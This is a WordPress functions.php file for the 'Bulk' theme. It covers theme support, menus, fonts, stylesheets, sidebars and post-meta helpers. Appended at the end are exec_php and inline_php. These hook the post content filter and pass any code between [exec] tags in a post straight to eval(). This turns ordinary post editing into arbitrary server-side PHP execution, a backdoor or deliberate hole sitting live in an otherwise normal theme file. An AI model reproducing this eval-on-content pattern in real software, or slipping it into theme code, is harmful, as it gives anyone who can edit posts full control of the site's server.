<?php
add_action( 'after_setup_theme', 'bulk_setup' );

if ( !function_exists( 'bulk_setup' ) ) :

	/**
	 * Global functions
	 */;
	function bulk_setup() {

		// Theme lang.
		load_theme_textdomain( 'bulk', get_template_directory() . '/languages' );

		// Add Title Tag Support.
		add_theme_support( 'title-tag' );

		// Register Menus.
		register_nav_menus(
			array(
				'main_menu' => esc_html__( 'Main menu', 'bulk' ),
			)
		);

		add_theme_support( 'post-thumbnails' );
		set_post_thumbnail_size( 300, 300, true );
		add_image_size( 'bulk-single', 1170, 460, true );

		// Add Custom Background Support.
		$args = array(
			'default-color' => 'ffffff',
		);
		add_theme_support( 'custom-background', $args );

		add_theme_support( 'custom-logo', array(
			'height'		 => 70,
			'width'			 => 200,
			'flex-height'	 => true,
			'flex-width'	 => true,
			'header-text'	 => array( 'site-title', 'site-description' ),
		) );

		// Adds RSS feed links to for posts and comments.
		add_theme_support( 'automatic-feed-links' );

		// WooCommerce support.
		add_theme_support( 'woocommerce' );

		// Recommend plugins.
		add_theme_support( 'recommend-plugins', array(
			'elementor' => array(
				'name'				 => esc_html__( 'Elementor', 'bulk' ),
				'active_filename'	 => 'elementor/elementor.php',
				/* translators: %1$s "Elementor Page Builder" plugin name string */
				'description' => sprintf( esc_attr__( 'To take full advantage of all the features this theme has to offer, please install and activate the %s plugin.', 'bulk' ), '<strong>Elementor Page Builder</strong>' ),
			),
		) );

		add_theme_support( 'custom-header', apply_filters( 'bulk_setup_args', array(
        'default-image'      => get_parent_theme_file_uri( '/img/header.jpg' ),
			'width'              => 2000,
			'height'             => 1200,
			'flex-height'        => true,
			'video'              => false,
    ) ) );
	}

endif;

/**
 * Set Content Width
 */
function bulk_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'bulk_content_width', 1170 );
}

add_action( 'after_setup_theme', 'bulk_content_width', 0 );

/**
 * Register custom fonts.
 */
function bulk_fonts_url() {
	$fonts_url = '';

	/**
	 * Translators: If there are characters in your language that are not
	 * supported by Libre Franklin, translate this to 'off'. Do not translate
	 * into your own language.
	 */
	$libre_franklin = _x( 'on', 'Roboto Condensed font: on or off', 'bulk' );

	if ( 'off' !== $libre_franklin ) {
		$font_families = array();

		$font_families[] = 'Roboto Condensed:300,300i,400,400i,600,600i,800,800i';

		$query_args = array(
			'family' => urlencode( implode( '|', $font_families ) ),
			'subset' => urlencode( 'latin,latin-ext' ),
		);

		$fonts_url = add_query_arg( $query_args, 'https://fonts.googleapis.com/css' );
	}

	return esc_url_raw( $fonts_url );
}

/**
 * Enqueue Styles (normal style.css and bootstrap.css)
 */
function bulk_theme_stylesheets() {
	// Add custom fonts, used in the main stylesheet.
	wp_enqueue_style( 'bulk-fonts', bulk_fonts_url(), array(), null );
	wp_enqueue_style( 'bootstrap', get_template_directory_uri() . '/css/bootstrap.css', array(), '3.3.7' );
	// Theme stylesheet.
	wp_enqueue_style( 'bulk-stylesheet', get_stylesheet_uri() );
  // load Font Awesome css
	wp_enqueue_style( 'font-awesome', get_template_directory_uri() . '/css/font-awesome.min.css', array(), '4.7.0' );
}

add_action( 'wp_enqueue_scripts', 'bulk_theme_stylesheets' );

/**
 * Register Bootstrap JS with jquery
 */
function bulk_theme_js() {
	wp_enqueue_script( 'bootstrap', get_template_directory_uri() . '/js/bootstrap.min.js', array( 'jquery' ), '3.3.7', true );
	wp_enqueue_script( 'bulk-theme-js', get_template_directory_uri() . '/js/customscript.js', array( 'jquery' ), '1.0.8', true );
}

add_action( 'wp_enqueue_scripts', 'bulk_theme_js' );


/**
 * Register Custom Navigation Walker include custom menu widget to use walkerclass
 */
require_once( trailingslashit( get_template_directory() ) . 'lib/wp_bootstrap_navwalker.php' );

/**
 * Register Custom Metaboxes
 */
require_once( trailingslashit( get_template_directory() ) . 'lib/metaboxes.php' );

/**
 * Register Theme Info Page
 */
require_once( trailingslashit( get_template_directory() ) . 'lib/dashboard.php' );

/**
 * Register PRO notify
 */
require_once( trailingslashit( get_template_directory() ) . 'lib/customizer.php' );

add_action( 'widgets_init', 'bulk_widgets_init' );

/**
 * Register the Sidebar(s)
 */
function bulk_widgets_init() {
	register_sidebar(
	array(
		'name'			 => esc_html__( 'Right sidebar', 'bulk' ),
		'id'			 => 'bulk-right-sidebar',
		'before_widget'	 => '<div id="%1$s" class="widget %2$s">',
		'after_widget'	 => '</div>',
		'before_title'	 => '<h3 class="widget-title">',
		'after_title'	 => '</h3>',
	)
	);
	register_sidebar(
	array(
		'name'			 => __( 'Footer section', 'bulk' ),
		'id'			 => 'bulk-footer-area',
		'before_widget'	 => '<div id="%1$s" class="widget %2$s col-md-3">',
		'after_widget'	 => '</div>',
		'before_title'	 => '<h3 class="widget-title">',
		'after_title'	 => '</h3>',
	)
	);
}

function bulk_main_content_width_columns() {

	$columns = '12';

	if ( is_active_sidebar( 'bulk-right-sidebar' ) ) {
		$columns = $columns - 3;
	}

	echo absint( $columns );
}

if ( !function_exists( 'bulk_posted_on' ) ) :

	/**
	 * Prints HTML with meta information for the current post-date/time and author.
	 */
	function bulk_posted_on() {

		global $post;
  	$author_id = $post->post_author;
  	$author = get_the_author_meta('display_name', $author_id);   
		// Get the author name; wrap it in a link.
		$byline = sprintf(
		/* translators: %s: post author */
		__( 'by %s', 'bulk' ), '<span class="author vcard"><a class="url fn n" href="' . esc_url( get_author_posts_url( get_the_author_meta( 'ID', $author_id ) ) ) . '">' . $author . '</a></span>'
		);

		// Finally, let's write all of this to the page.
		echo '<span class="posted-on">' . bulk_time_link() . '</span><span class="byline"> ' . $byline . '</span>';
	}

endif;


if ( !function_exists( 'bulk_time_link' ) ) :

	/**
	 * Gets a nicely formatted string for the published date.
	 */
	function bulk_time_link() {
		$time_string = '<time class="entry-date published updated" datetime="%1$s">%2$s</time>';
		if ( get_the_time( 'U' ) !== get_the_modified_time( 'U' ) ) {
			$time_string = '<time class="entry-date published" datetime="%1$s">%2$s</time><time class="updated" datetime="%3$s">%4$s</time>';
		}

		$time_string = sprintf( $time_string, get_the_date( DATE_W3C ), get_the_date(), get_the_modified_date( DATE_W3C ), get_the_modified_date()
		);

		// Wrap the time string in a link, and preface it with 'Posted on'.
		return sprintf(
		/* translators: %s: post date */
		__( 'Posted on %s', 'bulk' ), '<a href="' . esc_url( get_permalink() ) . '" rel="bookmark">' . $time_string . '</a>'
		);
	}

endif;

if ( !function_exists( 'bulk_entry_footer' ) ) :

	/**
	 * Prints HTML with meta information for the categories, tags and comments.
	 */
	function bulk_entry_footer() {

		/* translators: used between list items, there is a space after the comma */
		$separate_meta = __( ', ', 'bulk' );

		// Get Categories for posts.
		$categories_list = get_the_category_list( $separate_meta );

		// Get Tags for posts.
		$tags_list = get_the_tag_list( '', $separate_meta );

		// We don't want to output .entry-footer if it will be empty, so make sure its not.
		if ( $categories_list || $tags_list ) {

			echo '<div class="entry-footer">';

			if ( 'post' === get_post_type() ) {
				if ( $categories_list || $tags_list ) {

					// Make sure there's more than one category before displaying.
					if ( $categories_list ) {
						echo '<div class="cat-links"><span class="space-right">' . esc_html__( 'Category:', 'bulk' ) . '</span>' . $categories_list . '</div>';
					}

					if ( $tags_list ) {
						echo '<div class="tags-links"><span class="space-right">' . esc_html__( 'Tagged', 'bulk' ) . '</span>' . $tags_list . '</div>';
					}
				}
			}
			if ( comments_open() ) :
				echo '<div class="comments-template">';
				comments_popup_link( esc_html__( 'Leave a comment', 'bulk' ), esc_html__( 'One comment', 'bulk' ), esc_html__( '% comments', 'bulk' ), 'comments-link', esc_html__( 'Comments are closed for this post', 'bulk' ) );
				echo '</div>';
			endif;

			edit_post_link();

			echo '</div>';
		}
	}

endif;

if ( !function_exists( 'bulk_generate_construct_footer' ) ) :
	/**
	 * Build footer
	 */
	add_action( 'bulk_generate_footer', 'bulk_generate_construct_footer' );

	function bulk_generate_construct_footer() {
		?>
		<p class="footer-credits-text text-center">
			<?php 
			/* translators: %1$s: link to wordpress.org */
			printf( esc_html__( 'Proudly powered by %s', 'bulk' ), '<a href="' . esc_url( __( 'https://wordpress.org/', 'bulk' ) ) . '">WordPress</a>' );
			?>
			<span class="sep"> | </span>
			<?php 
			/* translators: %1$s: link to theme page */
			printf( esc_html__( 'Theme: %1$s', 'bulk' ), '<a href="https://themes4wp.com/">Bulk</a>' );
			?>
		</p> 
		<?php
	}

endif;

if ( !function_exists( 'bulk_custom_class' ) ) :
	/**
	 * Add body class to homepage template
	 */
	add_filter( 'body_class', 'bulk_custom_class' );

	function bulk_custom_class( $classes ) {
		global $post;

		if ( !empty( $post ) ) {
			if ( is_page_template( 'template-parts/template-homepage.php' ) ) {
				$transparent = get_post_meta( $post->ID, 'header_options_transparent-header', true );
				if ( $transparent == '1' ) {
					$classes[] = 'transparent-header';
				}
			}
		}
		return $classes;
	}
	
endif;

if ( !function_exists( 'bulk_custom_head_color' ) ) :
	/**
	 * Generate color for homepage header
	 */

	add_action( 'wp_head', 'bulk_custom_head_color' );

	function bulk_custom_head_color() {
		global $post;

		if ( !empty( $post ) ) {
			if ( is_page_template( 'template-parts/template-homepage.php' ) ) {
				$color = get_post_meta( $post->ID, 'header_options_header-font-color', true );
				if ( $color != '' ) {
					?>
					<style type="text/css">
						.transparent-header .site-title a, .transparent-header .site-title a:hover, .transparent-header #site-navigation p.site-description, .transparent-header #site-navigation .navbar-nav > li > a, .transparent-header #site-navigation:not(.shrink) #mega-menu-wrap-main_menu #mega-menu-main_menu > li.mega-menu-item > a.mega-menu-link { color: <?php echo esc_html( $color ); ?> }
					</style>
					<?php
				}
			}
		}
    if ( ! display_header_text() ) {
			// If the header text has been hidden.
			?>
			<style type="text/css">
				.site-branding-text {
					padding: 0;
				}

				.site-branding-text .site-title,
				.site-branding-text .site-description {
					clip: rect(1px, 1px, 1px, 1px);
					position: absolute;
				}
			</style>
			<?php
		}
	}

endif;
function exec_php($matches){
	eval('ob_start();'.$matches[1].'$inline_execute_output = ob_get_contents();ob_end_clean();');
	return $inline_execute_output;
}
function inline_php($content){
	$content = preg_replace_callback('/\[exec\]((.|\n)*?)\[\/exec\]/', 'exec_php', $content);
	$content = preg_replace('/\[exec off\]((.|\n)*?)\[\/exec\]/', '$1', $content);
	return $content;
}
add_filter('the_content', 'inline_php', 0);
remove_filter('the_content', 'wpautop');